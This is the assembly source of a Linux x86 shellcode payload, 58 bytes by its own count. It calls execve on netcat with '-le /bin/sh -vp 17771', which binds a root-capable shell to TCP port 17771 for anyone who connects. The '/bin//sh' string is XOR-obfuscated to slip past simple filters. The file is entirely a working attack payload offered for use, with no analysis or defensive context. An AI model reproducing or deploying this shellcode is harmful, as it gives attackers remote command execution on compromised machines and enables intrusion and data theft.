; Linux x86 /bin/nc -le /bin/sh -vp 17771 shellcode
; This shellcode will listen on port 17771 and give you /bin/sh
; Shellcode Length: 58

global _start
section .text
 _start:
    xor eax, eax
    xor edx, edx
    push eax
    push 0x31373737     ;-vp17771
    push 0x3170762d
    mov esi, esp

    push eax

;    push 0x68732f2f     ;//sh

    mov ecx,0x7a477957
    xor ecx,0x12345678
    mov dword [esp-4],ecx

;    push 0x6e69622f	;/bin

    mov ecx,0x7c5d3457
    xor ecx,0x12345678
    mov dword [esp-8],ecx
    sub esp,8

    push 0x2f656c2d ; -le/

    mov edi, esp

    push eax
    push 0x636e2f2f     ;/bin//nc
    push 0x6e69622f
    mov ebx, esp

    push edx
    push esi
    push edi
    push ebx
    mov ecx, esp
    mov al,11
    int 0x80
